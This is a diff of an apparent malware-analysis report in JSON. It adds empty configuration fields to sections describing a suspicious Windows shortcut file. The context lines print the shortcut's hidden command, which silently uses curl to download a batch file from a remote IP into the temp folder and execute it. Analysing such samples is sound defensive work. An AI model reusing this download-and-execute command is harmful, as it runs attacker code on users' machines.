@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [3.071332177774424, 2.7679626219079547, 3.876724451974264, 2.973228516134447, 2.820594200855323, 3.1674367232867007, 3.4193257160421173, 2.2995301445670657, 4.1813663288914595, 2.404718961093288, 1.321434937963176, 4.385956789702442, 2.8161808830076196, 2.8409404014017015, 3.018700598827056, 2.8409404014017015, 2.8081742830375824, 2.860805861984951, 2.913437440932319, 3.458453829233059, 3.5110854081804272, 4.879506460812009, 4.678151606748766, 2.5099821189880247, 2.815333779292342, 2.4883911157545326, 3.147571262703451, 3.8184956631409364, 3.9833552027854204, 1.1010831549700821, 1.5536653408537524, 0.932138039759375, 1.7006429741942497, 1.7319754147937156, 3.824092873026896, 2.246898565619697, 1.9265740220838907, 2.404718961093288, 4.193881518574894, 2.5099821189880247, 2.920596937187079, 3.366694137094749, 2.485420006550993, 2.610548625028979, 3.333325210755073, 2.6661513131798866, 2.5902024244826003, 3.667457607891745, 1.172253928364927, 0.0]}}",
+        "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,7 @@
       {
         "auto_collapse": false,
         "body": "{\"flags\": \"IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata\", \"file_attributes\": \"Archive\", \"create_date\": \"2021:09:18 17:06:25+00:00\", \"access_date\": \"2022:04:05 02:17:08+00:00\", \"modify_date\": \"2021:09:18 17:06:26+00:00\", \"target_file_size\": 289792, \"icon_index\": \"(none)\", \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"drive_type\": \"Fixed Disk\", \"volume_label\": \"\\u03f5\\u0373\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"working_directory\": \"C:\\\\Windows\\\\System32\", \"command_line_arguments\": \"/c \\\"curl http://121.5.28.63/cmd.txt > %temp%\\\\\\\\cmd.bat && %temp%\\\\\\\\cmd.bat\\\"\", \"machine_id\": \"desktop-gutn2mb\", \"fill_attributes\": \"0x07\", \"popup_fill_attributes\": \"0xf5\", \"screen_buffer_size\": \"120 x 9001\", \"window_size\": \"120 x 30\", \"window_origin\": \"0 x 0\", \"font_size\": \"8 x 18\", \"font_family\": \"Unknown (0x36)\", \"font_weight\": 400, \"font_name\": \"\\u65b0\\u5b8b\\u4f53\", \"cursor_size\": 25, \"full_screen\": \"No\", \"quick_edit\": \"Yes\", \"insert_mode\": \"Yes\", \"window_origin_auto\": \"Yes\", \"history_buffer_size\": 50, \"num_history_buffers\": 4, \"remove_history_duplicates\": \"No\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 0,
@@ -39,6 +41,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -69,6 +72,7 @@
       {
         "auto_collapse": false,
         "body": "{\"machine_identifier\": \"desktop-gutn2mb\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
@@ -87,6 +91,7 @@
       {
         "auto_collapse": false,
         "body": "{\"command_line_arguments\": \"/c \\\"curl http://121.5.28.63/cmd.txt > %temp%\\\\\\\\cmd.bat && %temp%\\\\\\\\cmd.bat\\\"\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\cmd.exe\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
